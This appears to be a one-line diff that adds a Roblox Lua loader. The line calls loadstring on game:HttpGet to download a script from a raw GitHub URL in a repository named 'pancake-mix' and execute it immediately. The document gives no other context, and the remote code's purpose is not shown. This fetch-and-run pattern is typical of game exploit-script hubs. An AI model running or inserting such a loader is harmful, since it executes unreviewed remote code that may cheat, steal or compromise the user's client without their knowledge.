@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfiniteXqz/pancake-mix/refs/heads/main/1", true))()
